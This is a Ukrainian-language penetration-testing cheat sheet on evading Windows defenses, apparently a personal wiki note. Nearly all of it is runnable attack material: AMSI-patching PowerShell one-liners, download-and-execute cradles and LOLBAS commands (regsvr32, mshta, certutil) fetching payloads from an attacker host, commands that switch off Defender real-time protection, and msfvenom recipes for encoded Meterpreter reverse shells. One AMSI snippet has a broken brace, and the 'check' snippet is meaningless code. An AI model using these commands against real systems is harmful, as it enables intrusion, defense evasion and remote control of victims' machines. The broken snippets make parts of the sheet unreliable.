# Bypasses (AMSI / AppLocker / PowerShell)

## PowerShell Execution Policy

```powershell
# Обхід без зміни системних налаштувань:
powershell -ep bypass -c "..."
powershell -ExecutionPolicy Bypass -File script.ps1
# З IEX (не пише на диск):
IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER>/script.ps1')
# Encode command:
$cmd = 'IEX(...)'
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell -enc <base64>
```

---

## AMSI Bypass (Anti-Malware Scan Interface)

AMSI перехоплює виклики PowerShell і .NET скриптів. Треба вимкнути до завантаження Mimikatz, PowerView, Rubeus тощо.

### Метод 1 — патч через рефлексію (найнадійніший, 2024)
```powershell
$a=[Ref].Assembly.GetTypes();foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');foreach($e in $d){if($e.Name -like "*Context"){$f=$e}};$f.SetValue($null,[IntPtr]32}
```

### Метод 2 — простий (може бути сигнатурно детектований)
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Метод 3 — через PowerShell 2.0 (якщо встановлено)
```powershell
powershell -version 2 -c "IEX ..."
```

### Перевірка що AMSI вимкнено
```powershell
# має повернути 1 (AMSI_RESULT_NOT_DETECTED), а не кинути виняток:
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer), [type])
# Простіше: просто запусти команду яку AMSI блокував — якщо пройшло, все OK
```

---

## AppLocker Bypass

### Перевір що заблоковано
```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

### Дозволені шляхи (за замовчуванням зазвичай не перекриті)
```
C:\Windows\Tasks\
C:\Windows\Temp\
C:\Windows\tracing\
C:\Windows\System32\spool\drivers\color\
%APPDATA%\
```

### Bypass через вбудовані бінарники (LOLBAS)
```powershell
# regsvr32 (виконує .sct/COM без AppLocker):
regsvr32 /s /n /u /i:http://<ATTACKER>/file.sct scrobj.dll
# mshta:
mshta http://<ATTACKER>/payload.hta
# certutil (завантаження + декодування):
certutil -urlcache -f http://<ATTACKER>/s.exe s.exe && s.exe
# installutil (запуск .NET):
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
# rundll32:
rundll32 javascript:"\..\mshtml,RunHTMLApplication ";eval("...")
```

### PowerShell через CLM (Constrained Language Mode) обхід
```powershell
# Перевір режим:
$ExecutionContext.SessionState.LanguageMode
# Якщо ConstrainedLanguage — пробуй через PowerShell 2.0 або PSExec з cmd
```

---

## Defender / AV — базове ухилення

```powershell
# Вимкнути real-time (потрібен local admin):
Set-MpPreference -DisableRealtimeMonitoring $true
# Додати виключення:
Add-MpPreference -ExclusionPath "C:\Temp"
# Перевірити стан:
Get-MpComputerStatus | select RealTimeProtectionEnabled
```

### Обфускація msfvenom payload
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -e x64/xor_dynamic -i 3 -f exe -o s.exe
# або через shikata_ga_nai (x86):
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -e x86/shikata_ga_nai -i 5 -f exe -o s.exe
```

**Підводні камені:**
- AMSI-bypass має бути виконаний **в тому ж** PS-сеансі перед завантаженням малварі
- AppLocker перевіряє hash + path — якщо whitelist по hash, copy-rename не допоможе
- Defender сигнатури оновлюються — якщо payload спрацьовував учора і не сьогодні, потрібна re-obfuscation

**Зв'язки:** [[Windows-PrivEsc]] · [[Shells-Payloads]] · [[Lateral-Movement]]
